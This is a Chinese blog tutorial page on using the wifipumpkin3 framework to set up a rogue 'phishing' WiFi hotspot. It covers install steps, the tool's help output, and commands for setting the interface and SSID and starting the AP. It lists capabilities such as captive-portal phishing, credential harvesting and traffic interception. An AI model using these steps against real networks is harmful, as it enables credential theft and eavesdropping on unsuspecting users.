@@ -1,0 +1,347 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>无线渗透，wifi钓鱼 | Hexo</title><meta name="keywords" content="无线渗透"><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="攻击种类 恶意接入点攻击 中间人攻击 解除认证攻击模块 extra-captiveflask 模板的模块 流氓DNS 服务器 俘虏门户攻击（captiveflask） 拦截、检查、修改和重放网络流量 WiFi网络扫描 DNS监控服务 凭证收集 透明代理 LLMNR、NBT-NS 和 MDNS 毒药（Responder3） RestFulAPI（已禁用） 还有更多！  安装用wifipumpkin3">
+<meta property="og:type" content="article">
+<meta property="og:title" content="无线渗透，wifi钓鱼">
+<meta property="og:url" content="http://example.com/2020/09/09/wifipumpkin3/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="攻击种类 恶意接入点攻击 中间人攻击 解除认证攻击模块 extra-captiveflask 模板的模块 流氓DNS 服务器 俘虏门户攻击（captiveflask） 拦截、检查、修改和重放网络流量 WiFi网络扫描 DNS监控服务 凭证收集 透明代理 LLMNR、NBT-NS 和 MDNS 毒药（Responder3） RestFulAPI（已禁用） 还有更多！  安装用wifipumpkin3">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20220112133323774.png">
+<meta property="article:published_time" content="2020-09-09T00:01:25.000Z">
+<meta property="article:modified_time" content="2022-01-12T07:09:26.437Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="无线渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20220112133323774.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2020/09/09/wifipumpkin3/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '无线渗透，wifi钓鱼',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-01-12 15:09:26'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const fontSizeVal = saveToLocal.get('global-font-size')
+    if (fontSizeVal !== undefined) {
+      document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
+    }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">208</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">56</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">77</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Hexo</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">无线渗透，wifi钓鱼</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-09-09T00:01:25.000Z" title="发表于 2020-09-09 08:01:25">2020-09-09</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-01-12T07:09:26.437Z" title="更新于 2022-01-12 15:09:26">2022-01-12</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F/">无线渗透</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="无线渗透，wifi钓鱼"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div><article class="post-content" id="article-container"><h1 id="攻击种类"><a href="#攻击种类" class="headerlink" title="攻击种类"></a>攻击种类</h1><ul>
+<li>恶意接入点攻击</li>
+<li>中间人攻击</li>
+<li>解除认证攻击模块</li>
+<li>extra-captiveflask 模板的模块</li>
+<li>流氓<strong>DNS 服务器</strong></li>
+<li>俘虏门户攻击（captiveflask）</li>
+<li><strong>拦截</strong>、检查、修改和重放<strong>网络流量</strong></li>
+<li><strong>WiFi</strong>网络扫描</li>
+<li><strong>DNS</strong>监控服务</li>
+<li>凭证收集</li>
+<li>透明代理</li>
+<li>LLMNR、NBT-NS 和 MDNS 毒药（<a target="_blank" rel="noopener" href="https://github.com/skelsec/Responder3">Responder3</a>）</li>
+<li>RestFulAPI（已禁用）</li>
+<li>还有<strong>更多</strong>！</li>
+</ul>
+<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>用<strong>wifipumpkin3</strong>编写的<code>Python 3</code>，你的机器上需要有一个可以工作的 Python（<strong>3.7 或更高版本</strong>）。</p>
+<p>注意</p>
+<ul>
+<li>不支持<strong>Windows</strong>。</li>
+<li>不支持<strong>Mac OS X。</strong>只有<strong>docker</strong>版本，但没有经过测试。</li>
+</ul>
+<h2 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h2><blockquote>
+<p> 您需要有一个支持<strong>接入点 (AP) 模式</strong>的 Wi-Fi 适配器。以下操作系统列表代表推荐的运行环境<code>wifipumpkin3</code>(wp3)，因为大多数必需的依赖项都已预先安装。还建议使用 VM 或 docker。</p>
+</blockquote>
+<h3 id="工具（预装）"><a href="#工具（预装）" class="headerlink" title="工具（预装）"></a>工具（预装）</h3><ul>
+<li>iptables（当前：iptables v1.6.1）</li>
+<li>iw（当前：iw 版本 4.14）</li>
+<li>网络工具（当前：版本（1.60+）</li>
+<li>无线工具（当前：版本 30~pre9-12）</li>
+<li>hostapd（当前：hostapd v2.6）</li>
+</ul>
+<h3 id="操作系统（推荐）"><a href="#操作系统（推荐）" class="headerlink" title="操作系统（推荐）"></a>操作系统（推荐）</h3><table>
+<thead>
+<tr>
+<th align="left">你</th>
+<th align="left">版本</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Ubuntu</td>
+<td align="left">18.04 LTS 仿生</td>
+</tr>
+<tr>
+<td align="left">码头工人</td>
+<td align="left">Ubuntu 18.04.4 LTS 仿生</td>
+</tr>
+</tbody></table>
+<h2 id="Debian-Ubuntu"><a href="#Debian-Ubuntu" class="headerlink" title="Debian/Ubuntu"></a>Debian/Ubuntu</h2><blockquote>
+<p>wifipumpkin3 使用端口 53 安装 python dns 服务器，当我尝试在 Ubuntu 18.04 上安装时，我收到一些错误，因为这个“端口 53 被另一个进程使用”。这个问题是由 systemd-resolved 引起的，只能按照下面的步骤来解决。</p>
+</blockquote>
+<ol>
+<li>停止 systemd-resolved “sudo systemctl stop systemd-resolved”</li>
+<li>用这些编辑/etc/systemd/resolved.conf</li>
+</ol>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install python3.7-dev libssl-dev libffi-dev build-essential python3.7</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/P0cL4bs/wifipumpkin3.git</span><br><span class="line"><span class="built_in">cd</span> wifipumpkin3</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
+
+<p>或<code>*.deb</code>从 GitHub <a target="_blank" rel="noopener" href="https://github.com/P0cL4bs/wifipumpkin3/releases">Releases</a>获取 Debian软件包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg -i wifipumpkin3-1.0.0-all.deb </span><br></pre></td></tr></table></figure>
+
+<h2 id="Kali-Linux安装"><a href="#Kali-Linux安装" class="headerlink" title="Kali Linux安装"></a>Kali Linux安装</h2><blockquote>
+<p>Kali Linux默认已经安装了<strong>python3.8</strong>兼容的<code>wp3</code>，我推荐安装一些系统包，操作系统级别的依赖</p>
+</blockquote>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install libssl-dev libffi-dev build-essential</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/P0cL4bs/wifipumpkin3.git</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="或者检查pyqt5是否安装成功："><a href="#或者检查pyqt5是否安装成功：" class="headerlink" title="或者检查pyqt5是否安装成功："></a>或者检查pyqt5是否安装成功：</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;from PyQt5.QtCore import QSettings; print(&#x27;done&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果等于<code>done</code></p>
+<h3 id="安装wifipumpkin3"><a href="#安装wifipumpkin3" class="headerlink" title="安装wifipumpkin3"></a>安装wifipumpkin3</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> wifipumpkin3</span><br><span class="line">sudo python3 setup.py install</span><br></pre></td></tr></table></figure>
+
+<h3 id="运行-wifipumpkin3"><a href="#运行-wifipumpkin3" class="headerlink" title="运行 wifipumpkin3"></a>运行 wifipumpkin3</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo  wifipumpkin3</span><br></pre></td></tr></table></figure>
+
+<p>咧</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali-rpi)-[~]</span><br><span class="line">└─$ sudo wifipumpkin3                                                                                                               1 ⨯</span><br><span class="line"></span><br><span class="line">                            .,<span class="string">&#x27;</span></span><br><span class="line"><span class="string">                        .&#x27;</span><span class="string">&#x27;.&#x27;</span></span><br><span class="line">                        .<span class="string">&#x27; .&#x27;</span></span><br><span class="line">            _.ood0Pp._ ,<span class="string">&#x27;  `.~ .q?00doo._</span></span><br><span class="line"><span class="string">        .od00Pd0000Pdb._. . _:db?000b?000bo.</span></span><br><span class="line"><span class="string">     .?000Pd0000Pd0000PdbMb?0000b?000b?0000b.</span></span><br><span class="line"><span class="string">    .d0000Pd0000Pd0000Pd0000b?0000b?000b?0000b.</span></span><br><span class="line"><span class="string">    d0000Pd0000Pd00000Pd0000b?00000b?0000b?000b.</span></span><br><span class="line"><span class="string">    00000Pd0000Pd0000Pd00000b?00000b?0000b?0000b</span></span><br><span class="line"><span class="string">    ?0000b?0000b?  WiFiPumpkin3  00Pd0000Pd0000P</span></span><br><span class="line"><span class="string">    ?0000b?0000b?0000b?00000Pd00000Pd0000Pd000P</span></span><br><span class="line"><span class="string">    `?0000b?0000b?0000b?0000Pd0000Pd0000Pd000P&#x27;</span></span><br><span class="line">     `?000b?0000b?000b?0000Pd000Pd0000Pd000P</span><br><span class="line">        `~?00b?000b?000b?000Pd00Pd000Pd00P<span class="string">&#x27;</span></span><br><span class="line"><span class="string">            `~?0b?0b?000b?0Pd0Pd000PdP~&#x27;</span></span><br><span class="line">                                     codename: Guaraci</span><br><span class="line">by: @mh4x0f - P0cL4bs Team | version: 1.0.9 dev</span><br><span class="line">[*] Session id: 320aeef8-7366-11ec-ac5d-dca632487d72 </span><br><span class="line">Starting prompt...</span><br><span class="line">wp3 &gt; </span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="查看网络设备器"><a href="#查看网络设备器" class="headerlink" title="查看网络设备器"></a>查看网络设备器</h1><blockquote>
+<p>查看是否支持ap</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iw list</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20220112134142825.png" alt="image-20220112134142825"></p>
+<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><h3 id="基本的命令"><a href="#基本的命令" class="headerlink" title="基本的命令"></a>基本的命令</h3><blockquote>
+<p>这个命令是在启动的时候使用的</p>
+</blockquote>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-i 	要绑定的网络接口，如果为空，则默认接口是旧会话启动。</span><br><span class="line">-s	用于继续攻击的会话，如果您传递旧的会话 ID，所有日志将添加到同一会话中</span><br><span class="line">--pulp	交互式会话可以使用 .pulp 文件编写脚本，这是一种自动化攻击的强大方法</span><br><span class="line">--xpulp	每个命令可以单独执行，也可以由 ; 连接起来。在字符串中</span><br><span class="line">--wireless-mode	使用此选项设置无线模式（静态、docker），默认为static 模式，但如果您想在 docker 容器上运行，您可以更改</span><br><span class="line">--no-colors	禁用终端颜色和效果</span><br><span class="line">-v, --version	显示程序的版本号并退出</span><br></pre></td></tr></table></figure>
+
+<h3 id="核心命令"><a href="#核心命令" class="headerlink" title="核心命令"></a>核心命令</h3><blockquote>
+<p>这个是在启动后用到</p>
+</blockquote>
+<p>我们进入help查看帮助信息</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">wp3 &gt; <span class="built_in">help</span></span><br><span class="line"></span><br><span class="line">[*] Available Commands:</span><br><span class="line">=======================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Core Commands:</span><br><span class="line">==============</span><br><span class="line"></span><br><span class="line">    Command      Description</span><br><span class="line">    -------      -----------</span><br><span class="line">    banner       display an awesome wp3 banner </span><br><span class="line">    <span class="built_in">exit</span>         <span class="built_in">exit</span> program and all threads</span><br><span class="line">    <span class="built_in">help</span>         show this <span class="built_in">help</span> </span><br><span class="line">    ignore       the message logger will be ignored </span><br><span class="line">    info         get information about proxy/plugin settings</span><br><span class="line">    <span class="built_in">kill</span>         terminate a module <span class="keyword">in</span> background by id</span><br><span class="line">    restore      the message logger will be restored </span><br><span class="line">    search       search modules by name</span><br><span class="line">    <span class="built_in">set</span>          <span class="built_in">set</span> variable proxy,plugin and access point </span><br><span class="line">    show         show available modules</span><br><span class="line">    update       pulling updates from remote git repository </span><br><span class="line">    use          select module <span class="keyword">for</span> modules</span><br><span class="line"></span><br><span class="line">Ap Commands:</span><br><span class="line">============</span><br><span class="line"></span><br><span class="line">    Command      Description</span><br><span class="line">    -------      -----------</span><br><span class="line">    ap           show all variable and status from AP </span><br><span class="line">    clients      show all connected clients on AP </span><br><span class="line">    dhcp         choise dhcp server configuration</span><br><span class="line">    dhcpmode     show/<span class="built_in">set</span> all available dhcp server </span><br><span class="line">    dump         dump informations from client connected on AP </span><br><span class="line">    <span class="built_in">jobs</span>         show all threads/processes <span class="keyword">in</span> background </span><br><span class="line">    mode         all wireless mode available </span><br><span class="line">    start        start access point service</span><br><span class="line">    stop         stop access point service</span><br><span class="line"></span><br><span class="line">Network Commands:</span><br><span class="line">=================</span><br><span class="line"></span><br><span class="line">    Command      Description</span><br><span class="line">    -------      -----------</span><br><span class="line">    plugins      show all available plugins </span><br><span class="line">    proxies      show all available proxies</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>翻译软件的翻译</p>
+</blockquote>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">[*] 可用命令：</span><br><span class="line">========================</span><br><span class="line">核心命令：</span><br><span class="line">===============</span><br><span class="line">    命令说明</span><br><span class="line">    -------- -----------</span><br><span class="line">    banner	显示一个很棒的 wp3 横幅</span><br><span class="line">    <span class="built_in">exit</span> 	退出程序和所有线程</span><br><span class="line">    <span class="built_in">help</span> 	显示此帮助</span><br><span class="line">    ignore	消息记录器将被忽略</span><br><span class="line">    info 	获取有关代理/插件设置的信息</span><br><span class="line">    <span class="built_in">kill</span> 	在后台通过 id 终止模块</span><br><span class="line">    restore 消息记录器将被恢复</span><br><span class="line">    search	称搜索搜索模块</span><br><span class="line">    <span class="built_in">set</span>		变量代理、插件和接入点</span><br><span class="line">    show 	显示可用模块</span><br><span class="line">    update 	从远程 git 存储库拉取更新</span><br><span class="line">    use		模块使用选择模块</span><br><span class="line">    </span><br><span class="line">应用命令：</span><br><span class="line">=============</span><br><span class="line">    命令说明</span><br><span class="line">    -------- ----------</span><br><span class="line">    ap 			显示来自 AP 的所有变量和状态</span><br><span class="line">    clients		显示 AP 上所有连接的客户端</span><br><span class="line">    dhcp 		选择 dhcp 服务器配置</span><br><span class="line">    dhcpmode 	显示/设置所有可用的 dhcp 服务器</span><br><span class="line">    dump		连接在 AP 上的客户端转储转储信息</span><br><span class="line">    <span class="built_in">jobs</span>		在后台显示所有线程/进程</span><br><span class="line">    mode		所有可用的无线模式</span><br><span class="line">    start 		启动接入点服务</span><br><span class="line">    stop 		停止接入点服务</span><br><span class="line">    </span><br><span class="line">网络命令：</span><br><span class="line">==================    </span><br><span class="line">	命令说明</span><br><span class="line">    -------- -----------</span><br><span class="line">    plugins 显示所有可用的插件</span><br><span class="line">    proxies	显示所有可用的代理</span><br></pre></td></tr></table></figure>
+
+<h2 id="搭建简单钓鱼热点"><a href="#搭建简单钓鱼热点" class="headerlink" title="搭建简单钓鱼热点"></a>搭建简单钓鱼热点</h2><blockquote>
+<p>查看来自 AP 的所有变量和状态</p>
+</blockquote>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wp3 &gt; ap</span><br><span class="line"></span><br><span class="line">[*] Settings AccessPoint:</span><br><span class="line">=========================</span><br><span class="line"></span><br><span class="line"> BSSID             | SSID   |   Channel | Interface   | Status      | Security</span><br><span class="line">-------------------+--------+-----------+-------------+-------------+------------</span><br><span class="line"> BC:F6:85:03:36:5B | wifipumpkin3    |        11 | eth       | not Running | <span class="literal">false</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>选择网卡</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wp3 &gt; set interface wlan0</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>设置热点名称</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wp3 &gt; set ssid zss</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>设置代理插件（后面会讲）</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wp3 &gt; set proxy noproxy</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>现在查看他的ap配置</p>
+</blockquote>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wp3 &gt; ap</span><br><span class="line"></span><br><span class="line">[*] Settings AccessPoint:</span><br><span class="line">=========================</span><br><span class="line"></span><br><span class="line"> BSSID             | SSID   |   Channel | Interface   | Status      | Security</span><br><span class="line">-------------------+--------+-----------+-------------+-------------+------------</span><br><span class="line"> BC:F6:85:03:36:5B | zss    |        11 | wlan0       | not Running | <span class="literal">false</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>启动</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wp3 &gt; start</span><br></pre></td></tr></table></figure>
+
+<h2 id="加载自己的配置文件"><a href="#加载自己的配置文件" class="headerlink" title="加载自己的配置文件"></a>加载自己的配置文件</h2><h3 id="文件方式加载"><a href="#文件方式加载" class="headerlink" title="文件方式加载"></a>文件方式加载</h3><blockquote>
+<p>用到的是<code>--pulp</code>参数</p>
+</blockquote>
+<p>格式</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo wifipumpkin3 --pulp 文件名</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>我们可以导入配置好的<code>.pulp</code> 文件</p>
+</blockquote>
+<p>文件内容保存在<code>/home/kali/wifipumpkin3/demo.pulp</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set interface wlan1</span><br><span class="line">set ssid zss</span><br><span class="line">set proxy noproxy</span><br></pre></td></tr></table></figure>
+
+<p>加载我的配置文件启动</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo wifipumpkin3 --pulp /home/kali/wifipumpkin3/demo.pulp</span><br></pre></td></tr></table></figure>
+
+<p>看一下结果</p>
